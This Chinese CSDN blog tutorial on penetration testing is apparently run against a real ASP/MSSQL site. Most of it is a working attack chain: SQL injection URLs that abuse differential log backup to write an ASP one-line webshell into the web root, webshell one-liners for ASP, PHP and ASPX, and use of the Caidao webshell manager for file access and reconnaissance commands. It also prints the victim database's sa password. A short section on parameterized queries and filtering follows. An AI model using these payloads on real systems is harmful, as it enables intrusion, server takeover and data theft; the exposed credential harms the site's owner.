
# [渗透&攻防] 三.数据库之差异备份及Caidao利器 - 杨秀璋的专栏 - CSDN博客

2017年07月23日 00:50:07[Eastmount](https://me.csdn.net/Eastmount)阅读数：2583标签：[网络安全																](https://so.csdn.net/so/search/s.do?q=网络安全&t=blog)[渗透																](https://so.csdn.net/so/search/s.do?q=渗透&t=blog)[差异备份																](https://so.csdn.net/so/search/s.do?q=差异备份&t=blog)[Caidao																](https://so.csdn.net/so/search/s.do?q=Caidao&t=blog)[数据库																](https://so.csdn.net/so/search/s.do?q=数据库&t=blog)[
							](https://so.csdn.net/so/search/s.do?q=Caidao&t=blog)[
																					](https://so.csdn.net/so/search/s.do?q=差异备份&t=blog)个人分类：[渗透&攻防																](https://blog.csdn.net/Eastmount/article/category/7023911)
[
																								](https://so.csdn.net/so/search/s.do?q=差异备份&t=blog)
[
				](https://so.csdn.net/so/search/s.do?q=渗透&t=blog)
[
			](https://so.csdn.net/so/search/s.do?q=渗透&t=blog)
[
		](https://so.csdn.net/so/search/s.do?q=网络安全&t=blog)

这是最近学习渗透和网站攻防的文章，前面文章从数据库原理解读了防止SQL注入、SQLMAP的基础用法。这篇文章主要讲解数据库知识之差异备份及强大的利器Caidao。希望能深入地学习这部分知识，自己作为一个初学者，在慢慢探索网络攻防和渗透。同时，希望文章对你有所帮助，尤其是学习网络安全的初学者，错误或不足之处还请海涵~
一.数据库之差异备份
1.差异备份
2.手动上传
二.Caidao基础用法
1.文件管理
2.数据库管理
3.虚拟终端
三.防御措施
1.参数化查询
2.基础防御措施
前文欣赏：
[[渗透&攻防] 一.从数据库原理学习网络攻防及防止SQL注入](http://blog.csdn.net/eastmount/article/details/75000575)
[[渗透&攻防] 二.SQL MAP工具从零解读数据库及基础用法](http://blog.csdn.net/Eastmount/article/details/75269811)

推荐文章：
[http://www.jianshu.com/p/f0797a485779](http://www.jianshu.com/p/f0797a485779)
[SQL参数化查询 - zyw_anquan](http://blog.csdn.net/zyw_anquan/article/details/22178821)

## 一. 数据库之差异备份
**1.差异备份**
数据备份主要分位完全备份、增量备份和差异备份。其中差异备份是指备份自上一次完全备份之后有变化的数据，在差异备份过程中，只备份有标记的那些选中的文件和文件夹。它不清除标记，即备份后不标记为已备份文件，不清除存档属性。
这里的整体流程是先备份日志，然后插入一句话Muma；再次备份时，数据库只会备份两次间隔中的差异，使得生成出来的文件尽可能小，故称为“差异备份”。
前面的文章获取了数据库的名称：
http://xxxxx/show.asp?code=-1**'**union all
select 1,null,3,null,null,6,host_name(),@@version,db_name(),10 --
输出结果如下所示：
附件1：AYD
附件2：Microsoft SQL Server....
附件3：ahykd_new
其中MSSQL数据库的名称就是ahykd_new，接下来相同的道理获取数据库所有表及列。
同时获取了登录名、密码等，这里不再介绍，下面详细介绍差异备份。

**(1) 修改数据库设置为恢复模式**
http://xxxxx/show.asp?code=-1**'**
**alter database ahykd_new set RECOVERY FULL --**
完全恢复模式是默认的恢复模式。在完全恢复模式下，需要手工的对事务日志进行管理，优点是可以恢复到数据库失败或者指定的时间点上。
**(2) 备份当前数据库日志到文件**
http://xxxxx/show.asp?code=-1**'**
**backup log ahykd_new to disk='C:\windows\temp\temp0720' with init --**
备份数据库日志到服务器上，其中路径表示服务器的。
重点：路径不能太显眼，比如"C:\0720"这样。
**(3) 建立一张表和一个字段**
http://xxxxx/show.asp?code=-1**'**
**create table tt(a text)--**
**(4) 往表中插入一句话Muma**
http://xxxxx/show.asp?code=-1**'**
**insert into tt(a) values('<%eval request("Shsh") %>') --**
一句话Muma插入到数据库tt表的a字段中，执行接收自定义Shsh参数，类似于URL的Code参数，相当于是一个侧门，第二部分Caidao会使用到。

```python
asp：
　　 <%execute(request("value"))%>
php：
　　 <?php @eval($_POST[value]);?>
aspx：
　　 <%eval(Request.Item["value"])%>
```
**(5) 再次备份日志**
http://xxxxx/show.asp?code=-1**'**
**backup log ahykd_new to disk='e:\NewsReport\index0.asp' --**
再次备份日志，备份路径为网站服务器路径，重点是如何获得这个路径呢？在网站注入时，报错提示通常会呈现相关文件路径。
**(6) 删除表**
http://xxxxx/show.asp?code=-1**'**
**drop table tt --**
此时，数据库差异备份的漏洞已经弄好，后面介绍Caidao利器。

**2.手动上传**
前面得到数据库登录的用户名和密码后，就可以手动登录，然后找到上传文件地方。
index0.asp文件代码为：<%eval request("Shsh") %>
然后利用Caidao利器可以进行拿站，问题是如何防御这些漏洞，请看第三部分内容。


## 二. Caidao基础用法
**1.登录Caidao**
首先关闭安全软件及实时防护，如下图所示。

![](https://img-blog.csdn.net/20170720203117087)
Caidao软件据说是一个桂林退役士兵写的，真的很厉害。它是一款Webshell管理工具，支持各种语言，常见的包括ASP、ASPX、PHP、JSP、CFM等，后面希望自己也能深入研究攻防底层内容，打开Caidao如下图所示。

![](https://img-blog.csdn.net/20170720203507800)
右键空白处，点击“添加”，在弹出界面填写相关内容。
![](https://img-blog.csdn.net/20170720203949124)
重点：Caidao的用户名为上传的文件，即index_0.asp，注意路径；密码为一句话Muma中插入的参数Shsh，对应前文<%eval request("Shsh") %>，选择ASP网站类型，点击“添加按钮”。
如果漏洞被修复，Caidao也会有相应的提示，如下提示服务器错误。
![](https://img-blog.csdn.net/20170720204956405)
下面介绍它强大的三个功能文件管理、数据库管理和虚拟终端，右键URL如下。

![](https://img-blog.csdn.net/20170720204730366)
PS：由于前面网站的漏洞已经修复了，网站攻防重点是从漏洞中找到防御措施，但它也打乱了我前后文的关联，但也是我Web防御的初衷。下面有两张图片引用文章[Chopper详细剖析](http://www.360doc.com/content/15/0204/01/597197_446101789.shtml)，推荐大家阅读，图侵立删。
**2.文件管理**
网站文件管理，显示服务器Webshell，远程访问服务显示wwwroot如下图所示。包括了常见的上传、下载、编辑、删除、复制重命名及改变文件时间戳等。
![](https://img-blog.csdn.net/20170722232411147?watermark/2/text/aHR0cDovL2Jsb2cuY3Nkbi5uZXQvRWFzdG1vdW50/font/5a6L5L2T/fontsize/400/fill/I0JBQkFCMA==/dissolve/70/gravity/Center)

前面的差异备份，我们通过SQL语句在服务器E盘上传了一个index0.asp文件。
backup log ahykd_new to disk='e:\NewsReport\index0.asp
可以在文件管理找到该文件，并下载到本地（因原网已修复，写文前未截图），可以通过Notepad++打开，虽然乱码很多，但可以搜索看到 <%eval request("Shsh") %> 这句代码。同时，备份服务器该账户没有写入权限，只能查看网站的内容及代码等。

**3.数据库管理**
Caidao支持各种数据库，包括MYSQL、MSSQL、ORCALE、ACCESS等，数据库管理主要是内置的管理数据库模块，能够实现数据库的查询语句、显示表名、列名。
前提：需要知道数据库的配置信息，可以从两个方面获得。
(1) 前面两篇文章通过SQL语句已经查到了数据库配置信息，即：
数据库 用户 密码
回顾：第一篇 手工SQL注入方法

```python
http://xxxxx/show.asp?code=-1' union all 
select 1,null,3,null,null,6,host_name(),@@version,db_name(),10 --  
输出结果如下所示：
    附件1：AYD
    附件2：Microsoft SQL Server....
    附件3：ahykd_new
其中数据库的名称就是ahykd_new，接下来相同的道理获取数据库所有表及列。
```
回顾：第二篇 SQLMAP方法
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --current-db
python sqlmap.py -u "http://.../tztgxx.aspx?code=115" --passwords
运行结果如下图所示，获取数据库用户和密码。
![](https://img-blog.csdn.net/20170717225556128)
(2) 文件管理中可以找到config配置文件，E盘index0.asp中即有，下载如下。
```python
<add key="ConnectionString" 
     value="Data Source=(local);DataBase=ahykd_new;User Id=sa;Password=xbs660818"/>
```
即：数据库ahykd_new，用户名sa，密码xbs660818。
Caidao中右键“数据库管理”，在弹出的界面设置数据库信息，点击“提交”。
![](https://img-blog.csdn.net/20170722235731999)
显示数据库如下所示：

![](https://img-blog.csdn.net/20170723000343753)
同时可以在顶端下拉菜单自定义SQL语句，点击“执行”获取所需信息。

**4.虚拟终端**
虚拟终端是模拟Windows下的CMD命令窗口，如果服务器是Linux就是shell窗口。如下图所示，常见命令：
(1) whoami 查看当前用户的权限；
(2) net user 查看当前计算机上的用户；
(3) net localgroup administrators 查看当前计算机上管理员的用户；
(4) ipconfig 查看计算机的网卡ip等信息，详细信息在后面加个 /all 查看；
(5) dir 查看当前目录的文件，后加个路径可查看目标文件夹的文件 dir c: \；

![](https://img-blog.csdn.net/20170723001320676)
更多的用法需要读者进一步取研究学习，包括原理知识。同时，难点是如何取找到漏洞、防御漏洞，SQL注入现在已经有很多好的防御措施了，第三部分接着介绍。


## 三. 防御措施
**1.参数化查询**
推荐阅读《SQL注入攻击与防御 第2版》作者：Justin Clarke。
PS：这部分参考网上，你可能也返现了这些列文字主要是攻击，防御是让它变白，后面几个月深入研究后会结合实际详细讲解，但还是推荐上面那本书。
参数化查询（Parameterized Query 或 Parameterized Statement）是指在设计与数据库链接并访问数据时，在需要填入数值或数据的地方，使用参数 (Parameter) 来给值，这个方法目前已被视为最有效可预防SQL注入攻击 (SQL Injection) 的攻击手法的防御方式。
有部份的开发人员可能会认为使用参数化查询，会让程序更不好维护，或者在实现部份功能上会非常不便，然而，使用参数化查询造成的额外开发成本，通常都远低于因为SQL注入攻击漏洞被发现而遭受攻击，所造成的重大损失。
原理：在使用参数化查询的情况下，数据库服务器不会将参数的内容视为SQL指令的一部份来处理，而是在数据库完成 SQL 指令的编译后，才套用参数运行，因此就算参数中含有具有损的指令，也不会被数据库所运行。
下面一段引用大神[何静媛](http://blog.csdn.net/hejingyuan6/article/details/8726457)的博客，强推大家阅读她的博客。
*参数化查询就是我们写好需要的参数，然后直接给参数赋值，这就好比是一个sql的框架。sql查询的时候会进行参数分析，如果分析的结果是我们曾使用过这样的框架，那么sql会重用查询计划，否则会重新生成一个查询计划，当然此时的sql的语义肯定是发生了变化，这时我们就可以很好的防止注入的发生。例如：*

![](https://img-my.csdn.net/uploads/201303/27/1364365891_4582.png)
*如上的代码就是使用参数化的查询语句，尝试输入注入字符无结果。*
在撰写 SQL 指令时，利用参数来代表需要填入的数值，例如：
(1) Microsoft SQL Server
Microsoft SQL Server 的参数格式是以 "@" 字符加上参数名称而成，SQL Server 亦支持匿名参数 "?"。
```python
SELECT * FROM myTable WHERE myID = @myID
INSERT INTO myTable (c1, c2, c3, c4) VALUES (@c1, @c2, @c3, @c4)
```
(2) MySQL
MySQL的参数格式是以 "?" 字符加上参数名称而成。
```python
UPDATE myTable SET c1 = ?c1, c2 = ?c2, c3 = ?c3 WHERE c4 = ?c4
```
(3) Oracle
Oracle 的参数格式是以 ":" 字符加上参数名称而成。
```python
UPDATE myTable SET c1 = :c1, c2 = :c2, c3 = :c3 WHERE c4 = :c4
```
(4) PostgreSQL
PostgreSQL 的参数格式是以 "$" 字符加上参数顺序号而成。
```python
UPDATE myTable SET c1 = $1, c2 = $2, c3 = $3 WHERE c4 = $4
```

**2.基础防御措施**
参考前文，个人理解的防御措施：
1.在URL设置不允许非法字符，如单引号、等号、注释--、减号，提示非法参数；
2.在URL设置不允许SQL常见的关键词，如and、select、or、insert等；
3.传递的id=115参数必须为数字才能正常跳转，否则跳转错误；
4.服务器启用SQL注入拦截功能，提示当前网页的 URL / POST / COOKIES中包含了特定的 SQL字符而被防火墙拦截，因为可能通过POST、Cookies进行攻击，各方面都需要做到防御。
5.可以使用JS在客户端进行不安全字符屏蔽，也可以在jsp中调用该函数检查是否包函非法字符，或使用正则表达式过滤传入的参数，防止SQL从URL注入。
希望文章对你有所帮助，尤其是网络安全的程序员，因为系列文章是和前文息息相关的，所以看着有些凌乱。如果文章存在错误或不足之处，还请海涵。感谢娜师傅的一路陪伴，来娜娜家玩深夜都还在写文，我也是很醉啊！
不忘初心，继续前行。加油，秀璋。绿妖，晚安！
(By:Eastmount 2017-07-23 凌晨1点[http://blog.csdn.net/eastmount/](http://blog.csdn.net/eastmount/))


